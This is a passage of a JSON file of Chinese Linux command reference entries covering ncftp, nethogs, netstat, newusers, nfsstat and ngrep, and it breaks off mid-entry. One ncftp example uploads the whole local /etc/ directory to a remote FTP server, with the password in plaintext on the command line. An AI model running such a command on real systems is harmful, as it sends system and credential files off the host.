        "body": "<h1 id=\"ncftp\">ncftp</h1>\n<p>是增强的的FTP工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ncftp命令</strong> 是增强的的ftp工具，比传统的FTP指令更加强大。FTP让用户得以下载存放于服务器主机的文件，也能将文件上传到远端主机放置。ncftp是文字模式FTP程序的佼佼者，它具备多样特色，包括显示传输速率，下载进度，自动续传，标住书签，可通过防火墙和代理服务器等。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ncftp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-u：指定登录FTP服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-p：指定登录FTP服务器时使用的密码；</span>\n<span class=\"hljs-deletion\">-P：如果FTP服务器没有使用默认的TCP协议的21端口，则使用此选项指定FTP服务器的端口号。</span>\n<span class=\"hljs-deletion\">-m：在传之前尝试在目录位置创建目录(用于传目录的情况)</span>\n<span class=\"hljs-deletion\">-R：递规传子目录</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>FTP服务器：指定远程FTP服务器的ip地址或主机名。</p>\n<h3 id=\"安装\">安装</h3>\n<pre><code class=\"language-shell\">wget ftp:<span class=\"hljs-regexp\">//</span>ftp.ncftp.com<span class=\"hljs-regexp\">/ncftp/</span>ncftp-<span class=\"hljs-number\">3.2</span>.<span class=\"hljs-number\">3</span>-src.tar.gz\ntar zxvf ncftp-<span class=\"hljs-number\">3.2</span>.<span class=\"hljs-number\">3</span>-src.tar.gz\ncd ncftp-<span class=\"hljs-number\">3.2</span>.<span class=\"hljs-number\">3</span>/\n.<span class=\"hljs-regexp\">/configure --prefix=/u</span>sr<span class=\"hljs-regexp\">/local/</span>ncftp\nmake &amp;&amp; make install\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>将本地/etc/目录内的所有文件和目录，上传到FTP服务器的flv/games/目录内(如果不存在flv/games/目录则自动创建)。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/ncftp/</span>bin<span class=\"hljs-regexp\">/ncftpput -u koumm -p koumm -P 21 -m -R 192.168.162.137  flv/g</span>ames<span class=\"hljs-regexp\">/ /</span>etc/*\n</code></pre>\n<p> <strong>指令说明</strong> </p>\n<p>ncftp的基本命令和普通ftp一样，可以输入help获得命令列表。对于所有的命令，都可以使用help &lt;命令&gt;的格式获得详细帮助。l开头的就是对本地执行的命令，其它的就是对登入的ftp服务目录的操作命令。</p>\n<p>增加的本地文件系统的操作命令：</p>\n<ul>\n<li>  lls: 列出本地当前目录文件；</li>\n<li>  lmkdir : 本地建立目录；</li>\n<li>  lrename: 本地文件改名；</li>\n<li>  lpwd: 显示当前本地路 径；</li>\n<li>  lchmod: 改变本地文件权限；</li>\n<li>  lpage: 显示本地文件内容；</li>\n<li>  lrm: 删除本地文件；</li>\n<li>  lrmdir: 删除本地目录。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nethogs",
        "des": "终端下的网络流量监控工具",
        "body": "<h1 id=\"nethogs\">nethogs</h1>\n<p>终端下的网络流量监控工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>有很多适用于Linux系统的开源网络监视工具。比如说，你可以用命令iftop来检查带宽使用情况。netstat用来查看接口统计报告，还有top监控系统当前运行进程。但是如果你想要找一个能够按进程实时统计网络带宽利用率的工具，那么NetHogs值得一看。</p>\n<p> <strong>NetHogs</strong> 是一个开源的命令行工具（类似于Linux的top命令），用来按进程或程序实时统计网络带宽使用率。</p>\n<p>来自NetHogs项目网站:</p>\n<blockquote>\n<p>NetHogs是一个小型的net top工具，不像大多数工具那样拖慢每个协议或者是每个子网的速度而是按照进程进行带宽分组。NetHogs不需要依赖载入某个特殊的内核模块。如果发生了网络阻塞你可以启动NetHogs立即看到哪个PID造成的这种状况。这样就很容易找出哪个程序跑飞了然后突然占用你的带宽。</p>\n</blockquote>\n<p>本文为你介绍如何在Unix/Linux操作系统下如何安装和使用NetHogs按进程监控网络带宽使用率。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">nethogs（选项）（参数）\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">usage: nethogs [-<span class=\"hljs-symbol\">V</span>] [-h] [-b] [-d seconds] [-v mode] [-c count] [-t] [-p] [-s] [device [device [device ...]]]\n  -<span class=\"hljs-symbol\">V</span> : 打印版本。\n  -h : 打印此帮助。\n  -b : bughunt模式 - 暗示tracemode。\n  -d : 延迟更新刷新率（以秒为单位）。 默认值为<span class=\"hljs-number\">1</span>。\n  -v : 视图模式（<span class=\"hljs-number\">0</span> = <span class=\"hljs-symbol\">KB</span> / s，<span class=\"hljs-number\">1</span> =总<span class=\"hljs-symbol\">KB</span>，<span class=\"hljs-number\">2</span> =总<span class=\"hljs-symbol\">B</span>，<span class=\"hljs-number\">3</span> =总<span class=\"hljs-symbol\">MB</span>）。 默认值为<span class=\"hljs-number\">0</span>。\n  -c : 更新次数。 默认为<span class=\"hljs-number\">0</span>（无限制）。\n  -t : tracemode.\n  -p : 煽动混乱模式（不推荐）。\n  -s : 按发送列排序输出。\n  -a : 监控所有设备，甚至环回/停止。\n  device : 要监控的设备。 默认是所有接口启动和运行，不包括环回\n\n当nethogs运行时，按：\n  q：退出\n  s：按<span class=\"hljs-symbol\">SENT</span>流量排序\n  r：按<span class=\"hljs-symbol\">RECEIVE</span>流量排序\n  m：在总（<span class=\"hljs-symbol\">KB</span>，<span class=\"hljs-symbol\">B</span>，<span class=\"hljs-symbol\">MB</span>）和<span class=\"hljs-symbol\">KB</span> / s模式之间切换\n</code></pre>\n<p>其他参数和用法</p>\n<pre><code class=\"language-shell\">-d : 刷新间隔\n-h : 帮助\n-p : <span class=\"hljs-type\">promiscious</span> 模式\n-t : <span class=\"hljs-type\">trace</span>模式 \n-V : 版本\n</code></pre>\n<p><strong>交互命令</strong></p>\n<p>以下是NetHogs的一些交互命令（键盘快捷键）</p>\n<ul>\n<li>  m : 修改单位</li>\n<li>  r : 按流量排序</li>\n<li>  s : 按发送流量排序</li>\n<li>  q : 退出命令提示符</li>\n</ul>\n<h3 id=\"安装\">安装</h3>\n<p><strong>在RHEL、CentOS和Fedora下安装NetHogs</strong></p>\n<p>要安装NetHogs，你必须要启用你所用Linux下的EPEL源。然后运行下面的yum命令下载安装NetHogs包。</p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> nethogs\n</code></pre>\n<p><strong>在Ubuntu、Linux mint和Debian下安装NetHogs</strong></p>\n<p>键入apt-get命令安装NetHogs包：</p>\n<pre><code class=\"language-shell\">$ sudo apt-<span class=\"hljs-built_in\">get</span> install nethogs\n</code></pre>\n<h3 id=\"nethogs用法\">NetHogs用法</h3>\n<p>在基于RedHat系统下键入如下命令启动NetHogs工具。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nethogs</span>\n</code></pre>\n<p>在Debian/Ubuntu/Linux Mint下要执行NetHogs你必须拥有root权限：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>sudo nethogs\n</code></pre>\n<p>!nethogs</p>\n<p>Ubuntu 12.10 下的NetHogs预览</p>\n<p>正如上图所示，send列和received列显示的是按照每个进程的流量统计。总的收发数据带宽在最下方，而且可以用交互命令控制排序，下面将要讨论这些交互命令。</p>\n<h3 id=\"nethogs-命令行参数\">NetHogs 命令行参数</h3>\n<p>以下就是NetHogs命令行的参数，用-d来添加刷新频率参数，device name 用来检测给定的某个或者某些设备的带宽（默认是eth0）。例如：设置5秒钟的刷新频率，键入如下命令即可：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nethogs</span> -d <span class=\"hljs-number\">5</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>sudo nethogs -d <span class=\"hljs-number\">5</span>\n</code></pre>\n<p>如果只用来监视设备（eth0）的网络带宽可以使用如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nethogs</span> eth0\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>sudo nethogs eth0\n</code></pre>\n<p>如果要同时监视eth0和eth1接口，使用以下命令即可：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nethogs</span> eth0 eth1\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>sudo nethogs eth0 eth1\n</code></pre>\n<p>关于NetHogs命令行工具的完整参数列表，可以参考NetHogs的手册，使用方法是在终端里输入<code>man nethogs</code>或者<code>sudo man nethogs</code>，更多信息请参考NetHogs项目主页。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "netstat",
        "des": "查看Linux中网络系统状态信息",
        "body": "<h1 id=\"netstat\">netstat</h1>\n<p>查看Linux中网络系统状态信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>netstat命令</strong> 用来打印Linux中网络系统的状态信息，可让你得知整个Linux系统的网络情况。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">netstat</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a或<span class=\"hljs-params\">--all</span>：显示所有连线中的Socket；\n-A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；\n-c或<span class=\"hljs-params\">--continuous</span>：持续列出网络状态；\n-C或<span class=\"hljs-params\">--cache</span>：显示路由器配置的快取信息；\n-e或<span class=\"hljs-params\">--extend</span>：显示网络其他相关信息；\n-F或<span class=\"hljs-params\">--fib</span>：显示FIB；\n-g或<span class=\"hljs-params\">--groups</span>：显示多重广播功能群组组员名单；\n-h或<span class=\"hljs-params\">--help</span>：在线帮助；\n-i或<span class=\"hljs-params\">--interfaces</span>：显示网络界面信息表单；\n-l或<span class=\"hljs-params\">--listening</span>：显示监控中的服务器的Socket；\n-M或<span class=\"hljs-params\">--masquerade</span>：显示伪装的网络连线；\n-n或<span class=\"hljs-params\">--numeric</span>：直接使用ip地址，而不通过域名服务器；\n-N或<span class=\"hljs-params\">--netlink</span>或<span class=\"hljs-params\">--symbolic</span>：显示网络硬件外围设备的符号连接名称；\n-o或<span class=\"hljs-params\">--timers</span>：显示计时器；\n-p或<span class=\"hljs-params\">--programs</span>：显示正在使用Socket的程序识别码和程序名称；\n-r或<span class=\"hljs-params\">--route</span>：显示Routing Table；\n-s或<span class=\"hljs-params\">--statistice</span>：显示网络工作信息统计表；\n-t或<span class=\"hljs-params\">--tcp</span>：显示TCP传输协议的连线状况；\n-u或<span class=\"hljs-params\">--udp</span>：显示UDP传输协议的连线状况；\n-v或<span class=\"hljs-params\">--verbose</span>：显示指令执行过程；\n-V或<span class=\"hljs-params\">--version</span>：显示版本信息；\n-w或<span class=\"hljs-params\">--raw</span>：显示RAW传输协议的连线状况；\n-x或<span class=\"hljs-params\">--unix</span>：此参数的效果和指定<span class=\"hljs-string\">\"-A unix\"</span>参数相同；\n<span class=\"hljs-params\">--ip</span>或<span class=\"hljs-params\">--inet</span>：此参数的效果和指定<span class=\"hljs-string\">\"-A inet\"</span>参数相同。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>列出所有端口 (包括监听和未监听的)</strong> </p>\n<pre><code class=\"language-shell\">netstat -<span class=\"hljs-keyword\">a</span>     <span class=\"hljs-comment\">#列出所有端口</span>\nnetstat -<span class=\"hljs-keyword\">at</span>    <span class=\"hljs-comment\">#列出所有tcp端口</span>\nnetstat -au    <span class=\"hljs-comment\">#列出所有udp端口                             </span>\n</code></pre>\n<p> <strong>列出所有处于监听状态的 Sockets</strong> </p>\n<pre><code class=\"language-shell\">netstat -l        <span class=\"hljs-meta\">#只显示监听端口</span>\nnetstat -<span class=\"hljs-keyword\">lt</span>       <span class=\"hljs-meta\">#只列出所有监听 tcp 端口</span>\nnetstat -<span class=\"hljs-built_in\">lu</span>       <span class=\"hljs-meta\">#只列出所有监听 udp 端口</span>\nnetstat -lx       <span class=\"hljs-meta\">#只列出所有监听 UNIX 端口</span>\n</code></pre>\n<p> <strong>显示每个协议的统计信息</strong> </p>\n<pre><code class=\"language-shell\">netstat -s   显示所有端口的统计信息\nnetstat -<span class=\"hljs-keyword\">st</span>   显示TCP端口的统计信息\nnetstat -<span class=\"hljs-keyword\">su</span>   显示UDP端口的统计信息\n\n​```<span class=\"hljs-keyword\">shell</span>\n\n<span class=\"hljs-comment\"> **在netstat输出中显示 PID 和进程名称** </span>\n\n​```<span class=\"hljs-keyword\">shell</span>\nnetstat -pt\n</code></pre>\n<p><code>netstat -p</code>可以与其它开关一起使用，就可以添加“PID/进程名称”到netstat输出中，这样debugging的时候可以很方便的发现特定端口运行的程序。</p>\n<p> <strong>在netstat输出中不显示主机，端口和用户名(host, port or user)</strong> </p>\n<p>当你不想让主机，端口和用户名显示，使用<code>netstat -n</code>。将会使用数字代替那些名称。同样可以加速输出，因为不用进行比对查询。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">netstat -an</span>\n</code></pre>\n<p>如果只是不想让这三个名称中的一个被显示，使用以下命令:</p>\n<pre><code class=\"language-shell\">netsat -<span class=\"hljs-keyword\">a</span> <span class=\"hljs-comment\">--numeric-ports</span>\nnetsat -<span class=\"hljs-keyword\">a</span> <span class=\"hljs-comment\">--numeric-hosts</span>\nnetsat -<span class=\"hljs-keyword\">a</span> <span class=\"hljs-comment\">--numeric-users</span>\n</code></pre>\n<p> <strong>持续输出netstat信息</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">netstat</span> -c   <span class=\"hljs-comment\">#每隔一秒输出网络信息</span>\n</code></pre>\n<p> <strong>显示系统不支持的地址族(Address Families)</strong> </p>\n<pre><code class=\"language-shell\">netstat <span class=\"hljs-comment\">--verbose</span>\n</code></pre>\n<p>在输出的末尾，会有如下的信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-title\">netstat</span>: no sup<span class=\"hljs-keyword\">port</span> for `AF IPX' on this system.\n<span class=\"hljs-title\">netstat</span>: no sup<span class=\"hljs-keyword\">port</span> for `AF AX25' on this system.\n<span class=\"hljs-title\">netstat</span>: no sup<span class=\"hljs-keyword\">port</span> for `AF X25' on this system.\n<span class=\"hljs-title\">netstat</span>: no sup<span class=\"hljs-keyword\">port</span> for `AF NETROM' on this system.\n</code></pre>\n<p> <strong>显示核心路由信息</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">netstat -r</span>\n</code></pre>\n<p>使用<code>netstat -rn</code>显示数字格式，不查询主机名称。</p>\n<p> <strong>找出程序运行的端口</strong> </p>\n<p>并不是所有的进程都能找到，没有权限的会不显示，使用 root 权限查看所有的信息。</p>\n<pre><code class=\"language-shell\">netstat -ap <span class=\"hljs-string\">| grep ssh</span>\n</code></pre>\n<p>找出运行在指定端口的进程：</p>\n<pre><code class=\"language-shell\">netstat -an | <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">':80'</span>\n</code></pre>\n<p> <strong>通过端口找进程ID</strong></p>\n<pre><code class=\"language-bash\">netstat -anp|<span class=\"hljs-type\">grep</span> <span class=\"hljs-number\">8081</span> | <span class=\"hljs-type\">grep</span> LISTEN|<span class=\"hljs-type\">awk</span> '{printf $<span class=\"hljs-number\">7</span>}'|<span class=\"hljs-type\">cut</span> -d/ -f1\n</code></pre>\n<p> <strong>显示网络接口列表</strong> </p>\n<pre><code class=\"language-shell\">netstat -<span class=\"hljs-selector-tag\">i</span>\n</code></pre>\n<p>显示详细信息，像是ifconfig使用<code>netstat -ie</code>。</p>\n<p> <strong>IP和TCP分析</strong> </p>\n<p>查看连接某服务端口最多的的IP地址：</p>\n<pre><code class=\"language-shell\">netstat -ntu | <span class=\"hljs-type\">grep</span> :<span class=\"hljs-number\">80</span> | <span class=\"hljs-type\">awk</span> '{print $<span class=\"hljs-number\">5</span>}' | <span class=\"hljs-type\">cut</span> -d: -f1 | <span class=\"hljs-type\">awk</span> '{++ip[$<span class=\"hljs-number\">1</span>]} END {<span class=\"hljs-keyword\">for</span>(i <span class=\"hljs-built_in\">in</span> ip) print ip[i],<span class=\"hljs-string\">\"\\t\"</span>,i}' | <span class=\"hljs-type\">sort</span> -nr\n</code></pre>\n<p>TCP各种状态列表：</p>\n<pre><code class=\"language-shell\">netstat -nt | grep -e <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> -e <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span> -e ::: -v | awk '/^tcp/ {++<span class=\"hljs-keyword\">state</span>[<span class=\"hljs-variable\">$NF</span>]} END {<span class=\"hljs-keyword\">for</span>(i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">state</span>) print i,<span class=\"hljs-string\">\"\\t\"</span>,<span class=\"hljs-keyword\">state</span>[i]}'\n</code></pre>\n<p>查看phpcgi进程数，如果接近预设值，说明不够用，需要增加：</p>\n<pre><code class=\"language-shell\">netstat -anpo | <span class=\"hljs-type\">grep</span> <span class=\"hljs-string\">\"php-cgi\"</span> | <span class=\"hljs-type\">wc</span> -l\n</code></pre>\n<h2 id=\"扩展知识\">扩展知识</h2>\n<h3 id=\"网络连接状态详解\">网络连接状态详解</h3>\n<p><strong>共有12中可能的状态</strong>，前面11种是按照TCP连接建立的三次握手和TCP连接断开的四次挥手过程来描述的：</p>\n<ol>\n<li><p>LISTEN：首先服务端需要打开一个socket进行监听，状态为 LISTEN，侦听来自远方TCP端口的连接请求 ；</p>\n</li>\n<li><p>SYN_SENT：客户端通过应用程序调用connect进行active open，于是客户端tcp发送一个SYN以请求建立一个连接，之后状态置为 SYN_SENT，在发送连接请求后等待匹配的连接请求；</p>\n</li>\n<li><p>SYN_RECV：服务端应发出ACK确认客户端的 SYN，同时自己向客户端发送一个SYN，之后状态置为，在收到和发送一个连接请求后等待对连接请求的确认；</p>\n</li>\n<li><p>ESTABLISHED：代表一个打开的连接，双方可以进行或已经在数据交互了， 代表一个打开的连接，数据可以传送给用户；</p>\n</li>\n<li><p>FIN_WAIT1：主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态， 等待远程TCP的连接中断请求，或先前的连接中断请求的确认；</p>\n</li>\n<li><p>CLOSE_WAIT：被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求(它的接收也作为文件结束符传递给上层应用程序)，并进入CLOSE_WAIT， 等待从本地用户发来的连接中断请求；</p>\n</li>\n<li><p>FIN_WAIT2：主动关闭端接到ACK后，就进入了 FIN-WAIT-2，从远程TCP等待连接中断请求；</p>\n</li>\n<li><p>LAST_ACK：被动关闭端一段时间后，接收到文件结束符的应用程 序将调用CLOSE关闭连接，这导致它的TCP也发送一个 FIN,等待对方的ACK.就进入了LAST-ACK，等待原来发向远程TCP的连接中断请求的确认；</p>\n</li>\n<li><p>TIME_WAIT:在主动关闭端接收到FIN后，TCP 就发送ACK包，并进入TIME-WAIT状态，等待足够的时间以确保远程TCP接收到连接中断请求的确认；</p>\n</li>\n<li><p>CLOSING: 比较少见，等待远程TCP对连接中断的确认；</p>\n</li>\n<li><p>CLOSED: 被动关闭端在接受到ACK包后，就进入了closed的状态，连接结束，没有任何连接状态；</p>\n</li>\n<li><p>UNKNOWN：未知的Socket状态；</p>\n</li>\n</ol>\n<p><strong>常见标志位</strong></p>\n<ul>\n<li><p>SYN: (同步序列编号,Synchronize Sequence Numbers)该标志仅在三次握手建立TCP连接时有效。表示一个新的TCP连接请求。</p>\n</li>\n<li><p>ACK: (确认编号,Acknowledgement Number)是对TCP请求的确认标志,同时提示对端系统已经成功接收所有数据。</p>\n</li>\n<li><p>FIN: (结束标志,FINish)用来结束一个TCP回话.但对应端口仍处于开放状态,准备接收后续数据。</p>\n</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "newusers",
        "des": "用于批处理的方式一次创建多个命令",
        "body": "<h1 id=\"newusers\">newusers</h1>\n<p>用于批处理的方式一次创建多个命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>newusers命令</strong> 用于批处理的方式一次创建多个命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">newusers</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户文件：指定包含用户信息的文本文件，文件的格式要与<code>/etc/passwd</code>相同。</p>\n<h3 id=\"实例\">实例</h3>\n<p>实用newusers命令批量添加用户：</p>\n<p>用法很简单，newusers后面直接跟一个文件，文件格式和<code>/etc/passwd</code>的格式相同。</p>\n<pre><code class=\"language-shell\">用户名<span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:x</span><span class=\"hljs-symbol\">:UID</span><span class=\"hljs-symbol\">:GID</span><span class=\"hljs-symbol\">:</span>用户说明<span class=\"hljs-symbol\">:</span>用户的家目录<span class=\"hljs-symbol\">:</span>所用SHELL\n</code></pre>\n<p>举例：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">jingang0:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">520</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">520</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-symbol\">:/home/jingang0</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n<span class=\"hljs-symbol\">jingang1:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">521</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">521</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-symbol\">:/home/jingang1</span><span class=\"hljs-symbol\">:/sbin/nologin</span>\n......\n</code></pre>\n<p>值得一提的是关于SHELL类型，查看主机上所有SHELL，可以通过chsh来查看：</p>\n<pre><code class=\"language-shell\">[root@localhost beinan]<span class=\"hljs-comment\"># chsh --list</span>\n<span class=\"hljs-regexp\">/bin/</span>sh\n<span class=\"hljs-regexp\">/bin/</span>bash\n<span class=\"hljs-regexp\">/sbin/</span>nologin\n<span class=\"hljs-regexp\">/bin/</span>ksh\n<span class=\"hljs-regexp\">/bin/</span>tcsh\n<span class=\"hljs-regexp\">/bin/</span>csh\n<span class=\"hljs-regexp\">/bin/</span>zsh\n</code></pre>\n<p>其中除了<code>/sbin/nologin</code>，其它类型的SHELL都能登录系统，nologin大多是虚拟用户用的SHELL，也就是说虽然他是系统用户，但他并无登录系统的权限；如果您想添加这类用户，就把他的SHELL设置成<code>/sbin/nologin</code>，比如上面的例子。</p>\n<p>关于用户名、UID、GID及用户的家目录是怎么回事，您可以读相应的参考文档。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nfsstat",
        "des": "列出NFS客户端和服务器的工作状态",
        "body": "<h1 id=\"nfsstat\">nfsstat</h1>\n<p>列出NFS客户端和服务器的工作状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nfsstat命令</strong> 用于列出NFS客户端和服务器的工作状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nfsstat</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：仅列出NFS服务器端状态；</span>\n<span class=\"hljs-deletion\">-c：仅列出NFS客户端状态；</span>\n<span class=\"hljs-deletion\">-n：仅列出NFS状态，默认显示nfs客户端和服务器的状态；</span>\n<span class=\"hljs-deletion\">-2：仅列出NFS版本2的状态；</span>\n<span class=\"hljs-deletion\">-3：仅列出NFS版本3的状态；</span>\n<span class=\"hljs-deletion\">-4：仅列出NFS版本4的状态；</span>\n<span class=\"hljs-deletion\">-m：打印以加载的nfs文件系统状态；</span>\n<span class=\"hljs-deletion\">-r：仅打印rpc状态。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>要显示关于客户机发送和拒绝的RPC和NFS调用数目的信息，输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nfsstat -c</span>\n</code></pre>\n<p>要显示和打印与客户机NFS调用相关的信息，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">nfsstat</span> -<span class=\"hljs-meta\">cn</span>\n</code></pre>\n<p>要显示和打印客户机和服务器的与RPC调用相关的信息，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nfsstat -r</span>\n</code></pre>\n<p>要显示关于服务器接收和拒绝的RPC和NFS调用数目的信息，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">nfsstat</span> –s\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ngrep",
        "des": "方便的数据包匹配和显示工具",
        "body": "<h1 id=\"ngrep\">ngrep</h1>\n<p>方便的数据包匹配和显示工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ngrep命令</strong> 是grep命令的网络版，他力求更多的grep特征，用于搜寻指定的数据包。正由于安装ngrep需用到libpcap库， 所以支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。</p>\n<h3 id=\"安装\">安装</h3>\n<p>ngrep命令的下载地址：<a href=\"http://ngrep.sourceforge.net/%EF%BC%8Clibpcap%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9Ahttp://www.tcpdump.org/%E3%80%82%E5%85%88%E7%94%A8%60yum\">http://ngrep.sourceforge.net/，libpcap下载地址：http://www.tcpdump.org/。先用`yum</a> install libpcap`完全安装libpcap，注意有时候用libpcap安装包安装的不完整会影响ngrep的使用。</p>\n<p>如果yum无法安装就用以下步骤安装libpcap：</p>\n<pre><code class=\"language-shell\">wget http:<span class=\"hljs-regexp\">//</span>www.tcpdump.org<span class=\"hljs-regexp\">/release/</span>libpcap-<span class=\"hljs-number\">1.3</span>.<span class=\"hljs-number\">0</span>.tar.gz\ntar -zxf libpcap-<span class=\"hljs-number\">1.3</span>.<span class=\"hljs-number\">0</span>.tar.gz\ncd libpcap-<span class=\"hljs-number\">1.3</span>.<span class=\"hljs-number\">0</span>\n./configure\nmake &amp;&amp; make install\n</code></pre>\n<p>ngrep的安装就是 configure/make/make install 三部曲。</p>\n<p>注：configure时是遇到 please wipe out all unused pcap installations，添加以下选项：</p>\n<pre><code class=\"language-shell\">.<span class=\"hljs-regexp\">/configure --with-pcap-includes=/u</span>sr<span class=\"hljs-regexp\">/local/i</span>nclude/pcap\n</code></pre>\n<p>在安装后输入ngrep来验证下安装是否成功。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ngrep <span class=\"hljs-attribute\">&lt;-LhNXViwqpevxlDtTRM&gt;</span> <span class=\"hljs-attribute\">&lt;-IO pcap_dump&gt;</span> <span class=\"hljs-attribute\">&lt;-n num&gt;</span> <span class=\"hljs-attribute\">&lt;-d dev&gt;</span> <span class=\"hljs-attribute\">&lt;-A num&gt;</span>\n<span class=\"hljs-attribute\">&lt;-s snaplen&gt;</span> <span class=\"hljs-attribute\">&lt;-S limitlen&gt;</span> <span class=\"hljs-attribute\">&lt;-w normal|byline|single|none&gt;</span> <span class=\"hljs-attribute\">&lt;-c cols&gt;</span>\n<span class=\"hljs-attribute\">&lt;-P char&gt;</span> <span class=\"hljs-attribute\">&lt;-F file&gt;</span> <span class=\"hljs-attribute\">&lt;match expression&gt;</span> <span class=\"hljs-attribute\">&lt;bpf filter&gt;</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>e <span class=\"hljs-comment\"># 显示空数据包</span>\n<span class=\"hljs-literal\">-</span>i <span class=\"hljs-comment\"># 忽略大小写</span>\n<span class=\"hljs-literal\">-</span>v <span class=\"hljs-comment\"># 反转匹配</span>\n<span class=\"hljs-literal\">-</span>R <span class=\"hljs-comment\"># don't do privilege revocation logic</span>\n<span class=\"hljs-literal\">-</span>x <span class=\"hljs-comment\"># 以16进制格式显示</span>\n<span class=\"hljs-literal\">-</span>X <span class=\"hljs-comment\"># 以16进制格式匹配</span>\n<span class=\"hljs-literal\">-</span>w <span class=\"hljs-comment\"># 整字匹配</span>\n<span class=\"hljs-literal\">-</span>p <span class=\"hljs-comment\"># 不使用混杂模式</span>\n<span class=\"hljs-literal\">-</span>l <span class=\"hljs-comment\"># make stdout line buffered</span>\n<span class=\"hljs-literal\">-</span>D <span class=\"hljs-comment\"># replay pcap_dumps with their recorded time intervals</span>\n<span class=\"hljs-literal\">-</span>t <span class=\"hljs-comment\"># 在每个匹配的包之前显示时间戳</span>\n<span class=\"hljs-literal\">-</span>T <span class=\"hljs-comment\"># 显示上一个匹配的数据包之间的时间间隔</span>\n<span class=\"hljs-literal\">-</span>M <span class=\"hljs-comment\"># 仅进行单行匹配</span>\n<span class=\"hljs-literal\">-</span>I <span class=\"hljs-comment\"># 从文件中读取数据进行匹配</span>\n<span class=\"hljs-literal\">-</span>O <span class=\"hljs-comment\"># 